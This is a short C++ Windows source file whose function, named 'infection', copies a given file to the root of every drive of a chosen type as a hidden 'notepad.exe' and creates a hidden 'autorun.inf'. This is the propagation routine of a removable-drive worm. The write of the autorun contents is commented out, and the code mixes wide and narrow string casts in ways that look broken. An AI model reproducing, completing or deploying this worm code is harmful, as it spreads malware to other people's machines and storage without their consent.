#include "Header.h"

void infection(LPWSTR pszFile, UINT uDriveType)
{

	wchar_t szDriveString[MAXBYTE] = { 0 };

	DWORD dwRet = 0;

	DWORD iNum = 0;
	
	wchar_t szRoot[4] = { 0 };

	UINT uType = 0;

	wchar_t szTarget[MAX_PATH] = { 0 };

	dwRet = GetLogicalDriveStrings(MAXBYTE, (LPSTR)szDriveString);

	while (iNum < dwRet)
	{
		lstrcpyn((LPSTR)szRoot, (LPSTR)szDriveString + iNum, 4);

		uType = GetDriveType((LPSTR)szRoot);

		if (uType == uDriveType) 
		{

			lstrcpy((LPSTR)szTarget, (LPSTR)szRoot);
			lstrcat((LPSTR)szTarget, (LPSTR)"notepad.exe");

			//int res=

			CopyFile((LPSTR)pszFile, (LPSTR)szTarget, FALSE);

			//CString ercd;
			//ercd.Format(_T("%d"),res);
			//MessageBox(NULL, szTarget, L"GG", MB_OK);

			SetFileAttributes((LPSTR)szTarget, FILE_ATTRIBUTE_HIDDEN);

			lstrcpy((LPSTR)szTarget, (LPSTR)szRoot);
			lstrcat((LPSTR)szTarget, (LPSTR)L"autorun.inf");

			HANDLE hFile = CreateFile((LPSTR)szTarget, //Создать дескриптор файла

			GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

			//ercd.Format(_T("%d"), GetLastError());
			//MessageBox(NULL, ercd, L"GG", MB_OK);
			DWORD dwWritten = 0;
			//			WriteFile(hFile, szAutoRun, sizeof(szAutoRun), &dwWritten, NULL);
			CloseHandle(hFile);

			SetFileAttributes((LPSTR)szTarget, FILE_ATTRIBUTE_HIDDEN);
		}
		iNum += 4;
	}
}